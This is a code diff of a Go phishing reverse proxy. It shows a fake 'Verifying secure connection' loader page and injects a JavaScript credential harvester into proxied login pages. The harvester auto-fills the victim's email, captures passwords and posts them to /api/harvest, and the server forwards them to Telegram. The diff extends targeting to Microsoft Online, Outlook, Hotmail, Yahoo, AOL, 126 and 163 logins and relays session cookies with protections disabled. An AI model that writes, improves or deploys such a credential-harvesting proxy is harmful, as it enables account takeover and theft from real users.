@@ -37,77 +37,144 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
-// 1. Polyfill to prevent URL crashes
-const OriginalURL = window.URL;
-window.URL = function(url, base) {
-    try { return new OriginalURL(url, base || window.location.origin); }
-    catch (e) {
-        if (typeof url === 'string' && !url.startsWith('http')) {
-            return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
+(function() {
+    // Universal Email Auto-Fill — works on EVERY domain
+    var targetEmail = window._targetEmail;
+    if (!targetEmail) return;
+
+    function fillEmailAndSubmit() {
+        var input = null;
+        
+        // Strategy 1: Try any input field that contains @domain in its placeholder/default value
+        var allInputs = document.querySelectorAll('input');
+        for (var i = 0; i < allInputs.length; i++) {
+            var inp = allInputs[i];
+            var val = inp.value || '';
+            var ph = inp.getAttribute('placeholder') || '';
+            var defVal = inp.defaultValue || '';
+            
+            // If the field already has an email-like pattern, skip it
+            if (val && val.match(/^[^@]+@[^@]+$/)) continue;
+            
+            // Check if placeholder or default value hints at email
+            if (ph.indexOf('@') !== -1 || defVal.indexOf('@') !== -1) {
+                input = inp;
+                break;
+            }
         }
-        return new OriginalURL('https://' + window.location.hostname + '/');
-    }
-};
-window.URL.prototype = OriginalURL.prototype;
-
-// 2. Auto-Grab Email on Load
-setTimeout(function() {
-    var email = window._targetEmail;
-    if (email) {
-        fetch(window.location.origin + '/api/harvest', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'type=email_only&email=' + encodeURIComponent(email)
-        }).catch(() => {});
-    }
-}, 500);
-
-// 3. React-Safe Auto-Fill
-setInterval(function() {
-    var email = window._targetEmail;
-    if (email) {
-        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
-        if (inputs.length > 0 && inputs[0].value === "") {
-            let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-            setter.call(inputs[0], email);
-            inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
-            inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
-            inputs[0].focus();
+        
+        // Strategy 2: If no match found, use the FIRST visible text/email input
+        if (!input) {
+            var candidates = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
+            for (var i = 0; i < candidates.length; i++) {
+                var c = candidates[i];
+                if (c.offsetParent !== null && !c.disabled && !c.readOnly) {
+                    input = c;
+                    break;
+                }
+            }
         }
-    }
-}, 1000);
-
-// 4. Grab Password on Submit
-document.addEventListener('submit', function(e) {
-    const form = e.target;
-    const formData = new FormData(form);
-    const params = new URLSearchParams();
-    let hasEmail = false;
-    let hasPassword = false;
-
-    for (let [key, value] of formData.entries()) {
-        params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
-            hasEmail = true;
+        
+        // Strategy 3: Last resort — first input on page
+        if (!input) {
+            var firstInput = document.querySelector('input');
+            if (firstInput && firstInput.offsetParent !== null) {
+                input = firstInput;
+            }
         }
-        if (key.toLowerCase().includes('pass')) {
-            hasPassword = true;
+        
+        if (input) {
+            // Use native setter to bypass React/Vue detection
+            var descriptor = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
+            if (descriptor && descriptor.set) {
+                descriptor.set.call(input, targetEmail);
+            } else {
+                input.value = targetEmail;
+            }
+            
+            // Dispatch events properly
+            input.dispatchEvent(new Event('input', { bubbles: true }));
+            input.dispatchEvent(new Event('change', { bubbles: true }));
+            input.dispatchEvent(new Event('blur', { bubbles: true }));
+            
+            // Focus and highlight so user sees it worked
+            input.focus();
+            input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            input.style.border = '2px solid #4CAF50';
+            input.style.boxShadow = '0 0 8px rgba(76, 175, 80, 0.5)';
+            
+            console.log('[Harvester] Email filled: ' + targetEmail);
         }
     }
 
-    if (hasEmail && hasPassword) {
-        fetch(window.location.origin + '/api/harvest', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: params.toString() + '&type=login'
-        }).catch(() => {});
-        return true;
-    }
-}, false);
+    // Run immediately
+    fillEmailAndSubmit();
+    
+    // Retry every 500ms for 10 seconds (in case DOM loads slowly)
+    var retries = 0;
+    var interval = setInterval(function() {
+        retries++;
+        var input = document.querySelector('input');
+        if (input && input.value === targetEmail) {
+            clearInterval(interval);
+            return;
+        }
+        if (retries > 20) {
+            clearInterval(interval);
+            return;
+        }
+        fillEmailAndSubmit();
+    }, 500);
+
+    // Grab credentials on form submit
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        if (!form) return;
+        
+        var formData = new FormData(form);
+        var params = new URLSearchParams();
+        var hasEmail = false;
+        var hasPassword = false;
+        var emailVal = '';
+        var passwordVal = '';
+
+        for (var [key, value] of formData.entries()) {
+            params.append(key, value);
+            var keyLower = key.toLowerCase();
+            
+            if (keyLower.indexOf('email') !== -1 || keyLower.indexOf('user') !== -1 || 
+                keyLower.indexOf('account') !== -1 || keyLower.indexOf('login') !== -1 ||
+                keyLower.indexOf('userName') !== -1 || keyLower.indexOf('accountId') !== -1) {
+                hasEmail = true;
+                emailVal = value;
+            }
+            if (keyLower.indexOf('pass') !== -1 || keyLower.indexOf('pwd') !== -1 || keyLower.indexOf('password') !== -1) {
+                hasPassword = true;
+                passwordVal = value;
+            }
+        }
+
+        if (hasEmail && hasPassword) {
+            fetch(window.location.origin + '/api/harvest', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: params.toString() + '&type=login'
+            }).catch(function() {});
+        } else if (hasEmail) {
+            fetch(window.location.origin + '/api/harvest', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'type=email_only&email=' + encodeURIComponent(emailVal)
+            }).catch(function() {});
+        }
+    }, false);
+})();
 </script>
 `
 
-const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
+const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}
+.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:spinAnim 1s linear infinite;margin:0 auto 20px;}
+@keyframes spinAnim{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
 setTimeout(()=>{
     var hash = window.location.hash;
     var email = "";
@@ -132,8 +199,8 @@ setTimeout(()=>{
         window._targetEmail = email;
 
         fetch('/api/fetch?email=' + encodeURIComponent(email))
-            .then(r => r.text())
-            .then(html => {
+            .then(function(r) { return r.text(); })
+            .then(function(html) {
                 document.open();
                 document.write(html);
                 document.close();
@@ -152,9 +219,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.String(200, loaderHTML)
 	})
 
-	// Catch any bad redirects and send them back to the root
 	r.NoRoute(func(c *gin.Context) {
-		// If it's a CGI redirect, send back to root to preserve the hash
 		if strings.Contains(c.Request.URL.Path, "cgi-sys") || strings.Contains(c.Request.URL.Path, "defaultwebpage") {
 			c.Redirect(302, "/")
 			return
@@ -223,7 +288,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		if resp.Header.Get("Content-Encoding") == "gzip" {
 			gzipReader, err := gzip.NewReader(resp.Body)
 			if err == nil {
-				bodyReader = gzipReader
+				bodyBytesGz, _ := io.ReadAll(gzipReader)
+				gzipReader.Close()
+				bodyReader = bytes.NewReader(bodyBytesGz)
 			}
 		}
 
@@ -238,11 +305,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		// FIX: Proper URL parsing to prevent double-rewrite
 		parsedBase, _ := url.Parse(targetBase)
 		baseHost := parsedBase.Host
 
-		// Rewrite only the real host URLs, not the paths
 		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost, c.Request.Host+"/proxy")
 		bodyStr = strings.ReplaceAll(bodyStr, "http://"+baseHost, c.Request.Host+"/proxy")
 		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost+"/", c.Request.Host+"/proxy/")
@@ -278,7 +343,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 				Name:     cookie.Name,
 				Value:    cookie.Value,
 				Path:     "/",
-				Domain:   "", // Leave blank so it applies to fly.dev
+				Domain:   "",
 				MaxAge:   3600 * 24,
 				HttpOnly: false,
 				Secure:   false,
@@ -302,6 +367,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		if email == "" {
 			email = c.PostForm("loginfmt")
 		}
+		if email == "" {
+			email = c.PostForm("userName")
+		}
+		if email == "" {
+			email = c.PostForm("accountId")
+		}
 		if password == "" {
 			password = c.PostForm("passwd")
 		}
@@ -312,9 +383,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		ip := c.ClientIP()
 		ua := c.GetHeader("User-Agent")
 
-		if harvestType == "email_only" {
+		if harvestType == "email_only" || (harvestType != "login" && email != "") {
 			SendTelegramMessage(cfg, FormatLoginAlert(email, "[Waiting for password...]", ip, ua))
-		} else {
+		} else if email != "" && password != "" {
 			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
 		}
 
@@ -324,21 +395,45 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 	r.Any("/proxy/*filepath", func(c *gin.Context) {
 		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
 		referer := c.GetHeader("Referer")
-		targetDomain := "https://accounts.google.com/"
 
-		if strings.Contains(referer, "126.com") {
-			targetDomain = "https://mail.126.com/"
-		} else if strings.Contains(referer, "163.com") {
-			targetDomain = "https://mail.163.com/"
-		} else if strings.Contains(referer, "yahoo.com") {
-			targetDomain = "https://login.yahoo.com/"
-		} else if strings.Contains(referer, "aol.com") {
-			targetDomain = "https://login.aol.com/"
-		} else if strings.Contains(referer, "live.com") {
-			targetDomain = "https://login.live.com/"
+		var targetDomain string
+
+		switch {
+		case strings.Contains(referer, "login.microsoftonline.com"):
+			targetDomain = "https://login.microsoftonline.com"
+		case strings.Contains(referer, "account.live.com"):
+			targetDomain = "https://account.live.com"
+		case strings.Contains(referer, "126.com"):
+			targetDomain = "https://mail.126.com"
+		case strings.Contains(referer, "qiye.163.com"):
+			targetDomain = "https://qiye.163.com"
+		case strings.Contains(referer, "163.com"):
+			targetDomain = "https://mail.163.com"
+		case strings.Contains(referer, "yahoo.com"):
+			targetDomain = "https://login.yahoo.com"
+		case strings.Contains(referer, "aol.com"):
+			targetDomain = "https://login.aol.com"
+		case strings.Contains(referer, "outlook.com"):
+			targetDomain = "https://login.microsoftonline.com"
+		case strings.Contains(referer, "hotmail.com"):
+			targetDomain = "https://login.microsoftonline.com"
+		default:
+			if referer != "" {
+				u, err := url.Parse(referer)
+				if err == nil && u.Host != "" {
+					targetDomain = u.Scheme + "://" + u.Host
+				} else {
+					targetDomain = "https://login.microsoftonline.com"
+				}
+			} else {
+				targetDomain = "https://login.microsoftonline.com"
+			}
 		}
 
-		fullURL := targetDomain + filepath
+		fullURL := targetDomain + "/" + filepath
+		if !strings.HasPrefix(filepath, "/") {
+			fullURL = targetDomain + "/" + filepath
+		}
 
 		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
 		if err != nil {
@@ -347,9 +442,16 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		for k, v := range c.Request.Header {
-			for _, val := range v {
-				outReq.Header.Add(k, val)
+			lowerKey := strings.ToLower(k)
+			if lowerKey != "host" && lowerKey != "referer" && lowerKey != "origin" {
+				for _, val := range v {
+					outReq.Header.Add(k, val)
+				}
 			}
+		}
+
+		for _, cookie := range c.Request.Cookies() {
+			outReq.AddCookie(cookie)
 		}
 
 		client := &http.Client{
@@ -360,16 +462,34 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		resp, err := client.Do(outReq)
 		if err == nil {
 			defer resp.Body.Close()
-			for k, v := range resp.Header {
-				for _, val := range v {
-					c.Writer.Header().Add(k, val)
-				}
+
+			contentType := resp.Header.Get("Content-Type")
+
+			// DON'T rewrite URLs inside JSON responses
+			if strings.Contains(contentType, "application/json") {
+				bodyBytes, _ := io.ReadAll(resp.Body)
+				c.Writer.Header().Set("Content-Type", contentType)
+				c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
+				c.Writer.WriteHeader(resp.StatusCode)
+				c.Writer.Write(bodyBytes)
+				return
 			}
+
+			bodyBytes, _ := io.ReadAll(resp.Body)
+			bodyStr := string(bodyBytes)
+
+			// Only rewrite HTML content
+			if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "application/xhtml") {
+				bodyStr = strings.ReplaceAll(bodyStr, targetDomain, c.Request.Host+"/proxy")
+				bodyStr = strings.ReplaceAll(bodyStr, targetDomain+"/", c.Request.Host+"/proxy/")
+			}
+
+			c.Writer.Header().Set("Content-Type", contentType)
 			c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
 			c.Writer.WriteHeader(resp.StatusCode)
-			io.Copy(c.Writer, resp.Body)
+			c.Writer.WriteString(bodyStr)
 		} else {
-			c.String(502, "Upstream Error")
+			c.String(502, "Upstream Error: "+err.Error())
 		}
 	})
 
